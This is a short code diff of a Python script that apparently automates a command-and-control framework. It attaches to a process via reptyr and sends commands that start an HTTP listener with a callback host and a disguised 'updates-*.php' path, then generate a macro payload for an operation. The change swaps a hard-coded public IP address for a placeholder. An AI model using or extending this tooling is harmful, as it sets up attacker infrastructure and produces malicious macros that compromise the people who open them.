@@ -51,7 +51,7 @@ else:
     print("reptyr -s %s"%process_id)
     p = subprocess.Popen(["reptyr", "-s", "%s"%process_id], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 
-a = ("listen_http 0.0.0.0 "+str(port_number)+" 35.180.227.97 5 updates-" + str(random.randint(0,1000000)) + ".php "+operation_name+"\n").encode()
+a = ("listen_http 0.0.0.0 "+str(port_number)+" #YOUR MEACHINE IP# 5 updates-" + str(random.randint(0,1000000)) + ".php "+operation_name+"\n").encode()
 b = ("generate_macro "+operation_name+" "+macro_name+"\n").encode()
 p.stdin.write(a)
 p.stdin.flush()
